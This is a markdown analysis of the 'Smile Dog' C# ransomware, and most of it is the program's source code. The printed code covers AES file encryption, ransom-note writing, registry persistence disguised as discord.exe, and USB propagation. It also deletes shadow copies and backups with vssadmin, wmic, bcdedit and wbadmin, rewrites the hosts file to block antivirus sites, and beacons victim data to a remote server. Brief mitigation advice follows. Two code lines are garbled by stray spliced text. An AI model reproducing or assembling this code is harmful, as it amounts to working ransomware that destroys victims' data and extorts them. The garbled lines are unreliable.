# Smile Dog Ransomware Analysis

This document provides a detailed analysis of the "Smile Dog Ransomware" code, a malicious C# program designed to encrypt files, demand ransom, spread to removable drives, and evade detection. The analysis includes descriptions of key components and behaviors, each illustrated with relevant code snippets to demonstrate functionality. This is for educational and defensive purposes only; reproducing or using this code maliciously is illegal and unethical.

## Overview

The ransomware performs the following malicious activities:
- Encrypts files using AES-256 and appends a `.sMilE` extension.
- Creates ransom notes (`SMILEJPG.txt`) with system details.
- Persists via Windows registry and file copying.
- Spreads to USB drives.
- Deletes backups and shadow copies.
- Blocks antivirus websites via hosts file modification.
- Communicates with a remote server.

## Key Components and Behaviors

### 1. File Encryption (`AES_Encrypt`, `EncryptFile`, `encryptDirectory`)

**Description**: Encrypts files using AES-256 in CBC mode with a hardcoded password (`allhailsmile` after Base64 decoding). Targets directories like Desktop and Downloads, skips files with `.sMilE` extension or `SMILEJPG.txt`, and limits encryption to files under 2GB.

**Code Illustration**:
- **AES Encryption**:
  ```csharp
  public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
  {
      byte[] result = null;
      byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
      using (MemoryStream memoryStream = new MemoryStream())
      {
          using RijndaelManaged rijndaelManaged = new RijndaelManaged();
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
              cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
              cryptoStream.Close();
          }
          result = memoryStream.ToArray();
      }
      return result;
  }
  ```

- **File Encryption**:
  ```csharp
  public void EncryptFile(string file, string password)
  {
      try
      {
          FileInfo fileInfo = new FileInfo(file);
          byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
          byte[] bytes = Encoding.UTF8.GetBytes(password);
          bytes = SHA256.Create().ComputeHash(bytes);
          string text = Base64Encode(fileInfo.Name);
          byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
          char[] invalidFileNameChars = Path.GetInvalidFileNameChars();
          foreach (char oldChar in invalidFileNameChars)
          {
              text = text.Replace(oldChar, '_');
          }
          File.WriteAllBytes(fileInfo.DirectoryName + "\\" + text + ".sMilE", bytes2);
          File.Delete(file);
          Console.WriteLine("encrypted: " + file + " >> " + file + ".sMilE");
          encryptedfiles = encryptedfiles + file + Environment.NewLine;
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  ```

- **Directory Encryption**:
  ```csharp
  public void encryptDirectory(string location, string password)
  {
      try
      {
          string text = "si";
          string[] source = new string[1] { "//aqui_extensiones" };
          string[] files = Directory.GetFiles(location);
          string[] directories = Directory.GetDirectories(location);
          for (int i = 0; i < files.Length; i++)
          {
              string fileName = Path.GetFileName(files[i]);
              string extension = Path.GetExtension(files[i]);
              string text2 = "no";
              if (extension == ".sMilE")
              {
                  continue;
              }
              if (text2 == "no")
              {
                  if (!(fileName == "SMILEJPG.txt"))
                  {
                      if (text == "si")
                      {
                          EncryptFile(files[i], password);
                      }
                      else if (source.Contains(extension))
                      {
                          EncryptFile(files[i], password);
                      }
                  }
                  continue;
              }
              long length = new FileInfo(files[i]).Length;
              if (fileName == "SMILEJPG.txt")
              {
                  continue;
              }
              if (text == "si")
              {
                  if (length <= 2147483648u)
                  {
                      EncryptFile(files[i], password);
                  }
              }
              else if (source.Contains(extension) && length <= 2147483648u)
              {
                  EncryptFile(files[i], password);
              }
          }
          for (int i = 0; i < directories.Length; i++)
          {
              encryptDirectory(directories[i], password);
          }
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  ```

### 2. Ransom Note Creation (`mensaje`, `messageCreator`)

**Description**: Creates `SMILEJPG.txt` files in targeted directories with a ransom message including a unique ID, username, computer name, IP, date, and encrypted files list. Displays the note if `nota_mostrar` is `"si"`.

**Code Illustration**:
- **Ransom Note Creation**:
  ```csharp
  public void mensaje(string location)
  {
      try
      {
          nota_mostrar = "si";
          string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE SMILE DOG RANSOMWARE".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
                  .Replace("%DATE%", DateTime.Now.ToString())
                  .Replace("%PRIVATEIP%", GetLocalIPAddress())
                  .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
          string[] files = Directory.GetFiles(location);
          string[] directories = Directory.GetDirectories(location);
          for (int i = 0; i < directories.Length; i++)
          {
              messageCreator(directories[i]);
          }
          File.WriteAllLines(location + "\\SMILEJPG.txt", contents);
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  ```

- **Recursive Note Creation**:
  ```csharp
  public void messageCreator(string location)
  {
      try
      {
          nota_mostrar = "si";
          string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE SMILE DOG RANSOMWARE".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
                  .Replace("%DATE%", DateTime.Now.ToString())
                  .Replace("%PRIVATEIP%", GetLocalIPAddress())
                  .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
          string[] directories = Directory.GetDirectories(location);
          File.WriteAllLines(location + "\\SMILEJPG.txt", contents);
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  ```

- **Displaying the Note**:
  ```csharp
  if (!(nota_mostrar == "no"))
  {
      File.WriteAllLines(folderPath6 + "\\SMILEJPG.txt", contents);
      Process.Start(folderPath6 + "\\SMILEJPG.txt");
  }
  ```

### 3. Persistence and Startup (`inicio_void`, `Main`)

**Description**: Adds itself to the startup registry as `discord` at `%LocalAppData%\discord.exe`. Hides its console window to avoid detection.

**Code Illustration**:
- **Registry Modification**:
  ```csharp
  public void inicio_void()
  {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
      registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
  }
  ```

- **Hiding Console Window**:
  ```csharp
  ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
  ```

- **Copying to Discord Path**:
  ```csharp
  File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
  ```

### 4. Self-Destruction (`autodestruir`)

**Description**: Deletes its executable and related files (e.g., `uac_location`) using hidden `cmd.exe` commands. Copies itself to `%LocalAppData%\discord.exe` for persistence.

**Code Illustration**:
```csharp
public void autodestruir()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string text = File.ReadAllText(folderPath + "\\uac_location");
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
    Process.Start(processStartInfo);
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
    processStartInfo2.FileName = "cmd.exe";
    processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
    processStart wrote:
    processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
    Process.Start(processStartInfo2);
    try
    {
        if (File.Exists(folderPath + "\\uac_location"))
        {
            File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
            File.Delete(File.ReadAllText(folderPath + "\\uac_location"));
        }
        else
        {
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### 5. USB Propagation (`USB`)

**Description**: Creates a batch file (`usb_maker.bat`) to copy itself to all drive letters (A: to Z:) as `nombre.exe`, enabling worm-like propagation.

**Code Illustration**:
```csharp
public void USB()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\nombre.exe" + Environment.NewLine + /* ... other drive letters ... */ + "copy \"" + location + "\" Z:\\nombre.exe" + Environment.NewLine + "exit";
    File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = folderPath + "\\usb_maker.bat";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    Process.Start(processStartInfo);
}
```

### 6. System Modifications

**Description**: Changes the wallpaper, empties the Recycle Bin, deletes backups, modifies the hosts file to block antivirus sites, and sets a non-critical process flag.

**Code Illustration**:
- **Wallpaper Change**:
  ```csharp
  public static void fondo()
  {
      try
      {
          File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
          random = CreateId(30);
          string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
          if (File.Exists(folderPath + "\\image.jpg"))
          {
              SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
              File.Delete(folderPath + "\\image.jpg");
          }
          else
          {
              File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
              SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
              File.Delete(folderPath + "\\image" + random + ".jpg");
          }
      }
      catch (Exception ex)
      {
          Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
      }
  }
  ```

- **Recycle Bin Emptying**:
  ```csharp
  [DllImport("shell32.dll")]
  private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);
  // Usage implied: SHEmptyRecycleBin(IntPtr.Zero, null, SHERB_NOC pieces of the code:
ONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
  ```

- **Backup Deletion**:
  ```csharp
  public void borrar()
  {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      processStartInfo.FileName = "cmd.exe";
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
      Process.Start(processStartInfo);
  }
  ```

- **Hosts File Modification**:
  ```csharp
  File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 localhost" + Environment.NewLine + "127.0.0.1 files.avast.com" + Environment.NewLine + /* ... many other antivirus sites ... */ + "127.0.0.1 www.youtube.com");
  ```

- **Critical Process Flag**:
  ```csharp
  NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
  ```

### 7. Network Communication (`conectar`)

**Description**: Sends system information (ID, username, etc.) to a remote server and checks for duplicate IDs. Retries if the network is unavailable.

**Code Illustration**:
```csharp
public static void conectar()
{
    try
    {
        string text = "https://unlatched-sticks.000webhostapp.com/data.php";
        Console.WriteLine("string enlace creado");
        Console.WriteLine("string informacion creado");
        string address = text + "data.php?info=" + ((Control)Program.text).Text;
        Console.WriteLine("strings fusionados");
        WebClient webClient = new WebClient();
        Console.WriteLine("webclient creado");
        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        Console.WriteLine("webclient headers");
        Stream stream = webClient.OpenRead(text + "data.txt");
        Console.WriteLine("data");
        StreamReader streamReader = new StreamReader(stream);
        Console.WriteLine("reader");
        string text2 = streamReader.ReadToEnd();
        Console.WriteLine("s");
        stream.Close();
        Console.WriteLine("data close");
        streamReader.Close();
        Console.WriteLine("reader close");
        if (text2.Contains(ID))
        {
            Console.WriteLine("ID ya en el servidor");
            return;
        }
        string text3 = new WebClient().DownloadString(address);
        Console.WriteLine("enviado");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
        conectar();
    }
}
```

### 8. System Tray Notification

**Description**: Displays a system tray notification with placeholder text.

**Code Illustration**:
```csharp
NotifyIcon val = new NotifyIcon();
val.Visible = true;
val.Icon = SystemIcons.Asterisk;
val.BalloonTipText = "notmen";
val.BalloonTipTitle = "titmen";
```

### 9. Miscellaneous

**Description**: Promotes the attacker's GitHub page and includes basic error handling.

**Code Illustration**:
- **GitHub Promotion**:
  ```csharp
  public void cmd2()
  {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      processStartInfo.FileName = "cmd.exe";
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
      Process.Start(processStartInfo);
  }
  ```

- **Error Handling**:
  ```csharp
  catch (Exception ex)
  {
      Console.WriteLine(ex.Message);
  }
  ```

## Malicious Intent

The ransomware aims to:
- **Encrypt Data**: Locks files with AES-256, making recovery difficult.
- **Extort Victims**: Demands ransom via notes (no payment mechanism specified).
- **Evade Detection**: Blocks antivirus updates and deletes backups.
- **Spread**: Infects USB drives.
- **Persist**: Uses registry and file copying.
- **Communicate**: Reports infections to a server.

## Technical Issues

- **Hardcoded Password**: `allhailsmile` could theoretically allow decryption.
- **Incomplete Ransom**: No payment instructions.
- **Network Loop**: Infinite retry on server failure.
- **Poor Naming**: Confusing variables (e.g., `text`, `text2`).
- **Unused Code**: Empty methods like `percodigo`.

## Security Implications

- **Data Loss**: Encrypted files are inaccessible.
- **System Compromise**: No recovery options.
- **Network Spread**: USB propagation.
- **Privacy Breach**: Sends system details.
- **Legal Risks**: Illegal to deploy.

## Mitigation and Prevention

- **Isolate System**: Disconnect from networks.
- **Do Not Pay**: No guarantee of decryption.
- **Restore Backups**: Use offline backups.
- **Wipe and Reinstall**: Remove persistence.
- **Report**: Contact authorities (e.g., FBI IC3).
- **Prevention**: Regular backups, antivirus, least privilege, disable autorun, educate users, patch systems.

## Ethical and Legal Notes

This analysis is for education and defense. Using or distributing this code is illegal. Seek professional help if infected.